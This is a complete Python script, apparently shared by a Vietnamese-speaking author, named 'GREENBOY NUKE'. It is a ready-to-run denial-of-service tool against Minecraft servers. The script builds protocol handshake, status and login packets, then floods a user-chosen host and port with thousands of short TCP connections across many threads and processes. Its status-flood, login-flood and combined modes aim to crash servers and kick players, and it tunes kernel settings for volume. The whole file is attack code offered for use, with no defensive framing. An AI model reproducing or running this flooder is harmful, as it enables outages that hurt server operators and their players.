#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ИМЯ ФАЙЛА: greenboy_nuke.py
# НАЗВАНИЕ: GREENBOY NUKE - FINAL DESTROYER
# АВТОР: GREENBOY
# НАЗНАЧЕНИЕ: NHẬP IP (CHỮ/SỐ) + PORT RIÊNG - HỦY DIỆT SERVER
# ПЛАТФОРМА: LINUX VPS (ROOT), WINDOWS, MACOS
# ============================================================

import socket
import threading
import time
import sys
import random
import struct
import os
import multiprocessing
import re

try:
    import resource
    resource.setrlimit(resource.RLIMIT_NOFILE, (2097152, 2097152))
    resource.setrlimit(resource.RLIMIT_NPROC, (2097152, 2097152))
except:
    pass

try:
    os.system('sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null')
    os.system('sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null')
    os.system('sysctl -w net.core.somaxconn=65535 2>/dev/null')
    os.system('sysctl -w net.ipv4.tcp_max_syn_backlog=65535 2>/dev/null')
    os.system('sysctl -w net.core.netdev_max_backlog=65535 2>/dev/null')
except:
    pass

TOOL_NAME = "GREENBOY NUKE"
TOOL_VERSION = "FINAL"
TOOL_AUTHOR = "GREENBOY"

attack_flag = True
stats = {'sent': 0, 'failed': 0, 'bytes': 0}
stats_lock = threading.Lock()

class C:
    G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'
    C = '\033[96m'; M = '\033[95m'; W = '\033[97m'
    B = '\033[1m'; X = '\033[0m'

def banner():
    print(f"""{C.R}{C.B}
   ██████╗ ██████╗ ███████╗███████╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗
  ██╔════╝ ██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██╔═══██╗╚██╗ ██╔╝
  ██║  ███╗██████╔╝█████╗  █████╗  ██╔██╗ ██║██████╔╝██║   ██║ ╚████╔╝ 
  ██║   ██║██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║██╔══██╗██║   ██║  ╚██╔╝  
  ╚██████╔╝██║  ██║███████╗███████╗██║ ╚████║██████╔╝╚██████╔╝   ██║   
   ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝  ╚═════╝    ╚═╝   
{C.X}
{C.G}  ╔═══════════════════════════════════════════════════════╗
  ║     {C.R}☢ GREENBOY NUKE - FINAL DESTROYER ☢{C.G}                 ║
  ║     {C.W}Author: {TOOL_AUTHOR} | Version: {TOOL_VERSION}{C.G}                       ║
  ║     {C.Y}IP (CHỮ/SỐ) + PORT RIÊNG - GỌN GÀNG DỄ DÙNG{C.G}           ║
  ╚═══════════════════════════════════════════════════════╝{C.X}
""")

def clean_ip(text):
    """XÓA KÝ TỰ ẨN, GIỮ CHỮ/SỐ/DẤU CHẤM/DẤU GẠCH"""
    text = text.strip()
    text = text.replace(' ', '').replace('\t', '').replace('\n', '').replace('\r', '')
    text = text.replace('\u200b', '').replace('\u200c', '').replace('\u200d', '')
    text = text.replace('\ufeff', '').replace('\u00a0', '')
    text = re.sub(r'[^a-zA-Z0-9\.\-]', '', text)
    return text

def clean_port(text):
    """CHỈ GIỮ LẠI SỐ"""
    text = text.strip()
    text = text.replace(' ', '').replace('\t', '').replace('\n', '').replace('\r', '')
    text = re.sub(r'[^0-9]', '', text)
    return text

# ============================================================
# ПРЕДСОБРАННЫЕ ПАКЕТЫ
# ============================================================
def make_varint_bytes(value):
    if value < 128:
        return bytes([value])
    result = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)

def make_string_bytes(text):
    encoded = text.encode('utf-8')
    return make_varint_bytes(len(encoded)) + encoded

class PacketCache:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.host_str = make_string_bytes(host)
        self.port_bytes = struct.pack('>H', port)
        self._cache = {}
        self._build()
    
    def _build(self):
        for proto in [767, 765, 763, 760]:
            inner = b'\x00' + make_varint_bytes(proto) + self.host_str + self.port_bytes + b'\x01'
            self._cache[f'hs_s_{proto}'] = make_varint_bytes(len(inner)) + inner
            
            inner_l = b'\x00' + make_varint_bytes(proto) + self.host_str + self.port_bytes + b'\x02'
            self._cache[f'hs_l_{proto}'] = make_varint_bytes(len(inner_l)) + inner_l
        
        self._cache['status'] = b'\x01\x00'
        
        self._cache['pings'] = []
        for _ in range(100):
            pkt = b'\x01' + struct.pack('>Q', random.randint(0, 2**63-1))
            self._cache['pings'].append(make_varint_bytes(len(pkt)) + pkt)
    
    def get_hs_status(self, proto=767):
        return self._cache.get(f'hs_s_{proto}', self._cache['hs_s_767'])
    
    def get_hs_login(self, proto=767):
        return self._cache.get(f'hs_l_{proto}', self._cache['hs_l_767'])
    
    def get_status(self):
        return self._cache['status']
    
    def get_random_login_packet(self):
        name = f"GB{random.randint(0,99999999):08d}"
        name_bytes = make_string_bytes(name)
        inner = b'\x00' + name_bytes
        return make_varint_bytes(len(inner)) + inner

# ============================================================
# АТОМНЫЙ ВОРКЕР
# ============================================================
class AtomicWorker:
    def __init__(self, host, port, duration, pc):
        self.host = host
        self.port = port
        self.duration = duration
        self.pc = pc
        self.end_time = time.time() + duration
        self.addr = (host, port)
    
    def run(self):
        global attack_flag, stats
        hs = self.pc.get_hs_status()
        sr = self.pc.get_status()
        combined = hs + sr
        
        while time.time() < self.end_time and attack_flag:
            batch = 0
            for _ in range(200):
                if time.time() >= self.end_time or not attack_flag:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sock.settimeout(0.05)
                    sock.connect(self.addr)
                    sock.sendall(combined)
                    sock.close()
                    batch += 1
                except:
                    pass
            with stats_lock:
                stats['sent'] += batch
                stats['bytes'] += batch * len(combined)

class LoginWorker:
    def __init__(self, host, port, duration, pc):
        self.host = host
        self.port = port
        self.duration = duration
        self.pc = pc
        self.end_time = time.time() + duration
        self.addr = (host, port)
    
    def run(self):
        global attack_flag, stats
        hs = self.pc.get_hs_login()
        
        while time.time() < self.end_time and attack_flag:
            batch = 0
            for _ in range(150):
                if time.time() >= self.end_time or not attack_flag:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sock.settimeout(0.08)
                    sock.connect(self.addr)
                    sock.sendall(hs)
                    login = self.pc.get_random_login_packet()
                    sock.sendall(login)
                    sock.close()
                    batch += 1
                except:
                    pass
            with stats_lock:
                stats['sent'] += batch
                stats['bytes'] += batch * (len(hs) + 100)

def process_worker(host, port, duration, pc, worker_count, worker_type):
    workers = []
    for _ in range(worker_count):
        if worker_type == 'status':
            w = AtomicWorker(host, port, duration, pc)
        else:
            w = LoginWorker(host, port, duration, pc)
        t = threading.Thread(target=w.run)
        t.daemon = True
        workers.append(t)
        t.start()
    for w in workers:
        w.join(timeout=1)

# ============================================================
# ГЛАВНАЯ ФУНКЦИЯ
# ============================================================
def main():
    global attack_flag, stats
    banner()
    
    # ============ NHẬP IP (CHỮ HOẶC SỐ) ============
    print(f"{C.C}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.C}║         {C.Y}NHẬP IP SERVER (CHỮ HOẶC SỐ ĐỀU ĐƯỢC){C.C}           ║")
    print(f"{C.C}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    
    while True:
        ip_input = input(f"{C.W}[?] IP (vd: node1.minet.vn hoặc 123.45.67.89): {C.G}").strip()
        host = clean_ip(ip_input)
        if host and len(host) >= 3:
            break
        else:
            print(f"{C.R}[!] Không được trống, ít nhất 3 ký tự!{C.X}")
    
    # ============ PHÂN GIẢI IP ============
    try:
        resolved_ip = socket.gethostbyname(host)
        if resolved_ip != host:
            print(f"{C.G}[✓] {host} → {resolved_ip}{C.X}")
        else:
            print(f"{C.G}[✓] IP: {host}{C.X}")
    except:
        print(f"{C.R}[!] KHÔNG PHÂN GIẢI ĐƯỢC: {host}{C.X}")
        sys.exit(1)
    
    # ============ NHẬP PORT ============
    print(f"\n{C.C}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.C}║              {C.Y}NHẬP PORT SERVER{C.C}                          ║")
    print(f"{C.C}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    
    while True:
        port_input = input(f"{C.W}[?] PORT (Enter = 25565): {C.G}").strip()
        port_input = clean_port(port_input)
        if port_input == '':
            port = 25565
            print(f"{C.G}[✓] Dùng port mặc định: 25565{C.X}")
            break
        try:
            port = int(port_input)
            if 1 <= port <= 65535:
                break
            else:
                print(f"{C.R}[!] Port từ 1 đến 65535!{C.X}")
        except ValueError:
            print(f"{C.R}[!] Phải nhập số!{C.X}")
    
    # ============ BOT ============
    while True:
        try:
            bot_input = input(f"{C.W}[?] SỐ BOT (500-5000): {C.G}").strip()
            bot_input = clean_port(bot_input)
            bot_count = int(bot_input)
            if bot_count > 0:
                break
            else:
                print(f"{C.R}[!] Phải > 0!{C.X}")
        except ValueError:
            print(f"{C.R}[!] Phải nhập số!{C.X}")
    
    # ============ THỜI GIAN ============
    while True:
        try:
            dur_input = input(f"{C.W}[?] THỜI GIAN (giây, 120-600): {C.G}").strip()
            dur_input = clean_port(dur_input)
            duration = int(dur_input)
            if duration > 0:
                break
            else:
                print(f"{C.R}[!] Phải > 0!{C.X}")
        except ValueError:
            print(f"{C.R}[!] Phải nhập số!{C.X}")
    
    # ============ CHẾ ĐỘ ============
    print(f"\n{C.C}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.C}║              {C.Y}CHỌN CHẾ ĐỘ{C.C}                               ║")
    print(f"{C.C}╠═══════════════════════════════════════════════════════╣{C.X}")
    print(f"{C.C}║ {C.W}1. {C.G}TURBO STATUS  {C.C}- Tốc độ cao nhất{C.C}                    ║")
    print(f"{C.C}║ {C.W}2. {C.G}LOGIN FLOOD   {C.C}- Đốt đăng nhập, kick người chơi{C.C}       ║")
    print(f"{C.C}║ {C.W}3. {C.R}HAMMER        {C.C}- Hủy diệt hoàn toàn (mạnh nhất){C.C}      ║")
    print(f"{C.C}╚═══════════════════════════════════════════════════════╝{C.X}")
    
    while True:
        mode_input = input(f"{C.W}[?] CHỌN (1/2/3, mặc định 3): {C.G}").strip()
        mode_input = clean_port(mode_input)
        if mode_input == '':
            mode_input = '3'
        if mode_input in ['1', '2', '3']:
            mode = int(mode_input)
            break
        print(f"{C.R}[!] Chỉ chọn 1, 2, hoặc 3!{C.X}")
    
    mode_names = {1: 'TURBO STATUS', 2: 'LOGIN FLOOD', 3: 'HAMMER'}
    
    # ============ XÁC NHẬN ============
    print(f"\n{C.R}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.R}║              {C.B}☢ XÁC NHẬN MỤC TIÊU ☢{C.X}{C.R}                   ║")
    print(f"{C.R}╠═══════════════════════════════════════════════════════╣{C.X}")
    print(f"{C.R}║ {C.W}IP:        {C.G}{host}{C.X}{C.R}                                  ║")
    print(f"{C.R}║ {C.W}PORT:      {C.G}{port}{C.X}{C.R}                                      ║")
    print(f"{C.R}║ {C.W}BOT:       {C.G}{bot_count}{C.X}{C.R}                                      ║")
    print(f"{C.R}║ {C.W}THỜI GIAN: {C.G}{duration} giây{C.X}{C.R}                                  ║")
    print(f"{C.R}║ {C.W}CHẾ ĐỘ:    {C.G}{mode_names[mode]}{C.X}{C.R}                         ║")
    print(f"{C.R}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    
    confirm = input(f"{C.R}{C.B}[☢] GÕ 'PHÁ' ĐỂ XÁC NHẬN: {C.G}").strip()
    
    if confirm.upper() != 'PHÁ':
        print(f"{C.Y}[!] ĐÃ HỦY!{C.X}")
        sys.exit(0)
    
    print(f"\n{C.R}{C.B}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.R}{C.B}║  ☢ ĐANG PHÁ HỦY SERVER... CHỜ BAY MÀU ☢  ║{C.X}")
    print(f"{C.R}{C.B}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    
    pc = PacketCache(host, port)
    
    cpu_count = multiprocessing.cpu_count()
    num_processes = min(cpu_count * 4, bot_count // 20) if bot_count > 20 else 1
    if num_processes < 1:
        num_processes = 1
    
    workers_per_process = bot_count // num_processes
    
    start_time = time.time()
    processes = []
    
    for i in range(num_processes):
        if mode == 1:
            wtype = 'status'
        elif mode == 2:
            wtype = 'login'
        else:
            wtype = 'status' if i % 2 == 0 else 'login'
        
        p = multiprocessing.Process(
            target=process_worker,
            args=(host, port, duration, pc, workers_per_process, wtype)
        )
        p.daemon = True
        processes.append(p)
        p.start()
    
    try:
        last_sent = 0
        while time.time() - start_time < duration and attack_flag:
            time.sleep(1)
            elapsed = time.time() - start_time
            with stats_lock:
                sent = stats['sent']
                failed = stats['failed']
                mb = stats['bytes'] / 1024 / 1024
            current_rate = sent - last_sent
            last_sent = sent
            bar_len = min(40, int(current_rate / 2500))
            bar = '█' * bar_len + '░' * (40 - bar_len)
            print(f"\r{C.R}[{elapsed:.0f}s]{C.X} {C.Y}[{bar}]{C.X} {C.G}{sent:,}{C.X} gói | {C.R}{failed:,}{C.X} lỗi | {C.M}{current_rate:,}{C.X} gói/s | {C.C}{mb:.1f}{C.X} MB   ", end='')
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] DỪNG!{C.X}")
        attack_flag = False
    
    attack_flag = False
    for p in processes:
        p.join(timeout=2)
        if p.is_alive():
            p.terminate()
    
    elapsed = time.time() - start_time
    final_rate = stats['sent'] / elapsed if elapsed > 0 else 0
    
    print(f"\n\n{C.R}{C.B}╔═══════════════════════════════════════════════════════╗{C.X}")
    print(f"{C.R}{C.B}║     ☢ GREENBOY NUKE - KẾT THÚC ☢{C.X}{C.R}                ║")
    print(f"{C.R}{C.B}╠═══════════════════════════════════════════════════════╣{C.X}")
    print(f"{C.R}{C.B}║ {C.W}IP:        {C.G}{host}:{port}{C.X}{C.R}{C.B}                              ║")
    print(f"{C.R}{C.B}║ {C.W}THỜI GIAN: {C.G}{elapsed:.1f} giây{C.X}{C.R}{C.B}                            ║")
    print(f"{C.R}{C.B}║ {C.W}TỔNG GÓI: {C.G}{stats['sent']:,}{C.X}{C.R}{C.B}                              ║")
    print(f"{C.R}{C.B}║ {C.W}TỐC ĐỘ TB: {C.G}{final_rate:,.0f} gói/s{C.X}{C.R}{C.B}                       ║")
    print(f"{C.R}{C.B}║ {C.W}TRAFFIC: {C.G}{stats['bytes']/1024/1024:.1f} MB{C.X}{C.R}{C.B}                           ║")
    print(f"{C.R}{C.B}╚═══════════════════════════════════════════════════════╝{C.X}")
    
    if final_rate >= 10000:
        print(f"\n{C.R}{C.B}╔═══════════════════════════════════════════════════════╗{C.X}")
        print(f"{C.R}{C.B}║  ☢ SERVER CHẮC CHẮN ĐÃ BAY! ĐẬP TAY ĐI! ☢  ║{C.X}")
        print(f"{C.R}{C.B}╚═══════════════════════════════════════════════════════╝{C.X}\n")
    else:
        print(f"\n{C.Y}[!] Tốc độ chưa đủ cao. Chạy lại với nhiều BOT hơn hoặc VPS mạnh hơn!{C.X}\n")

if __name__ == "__main__":
    try:
        os.nice(-20)
    except:
        pass
    main()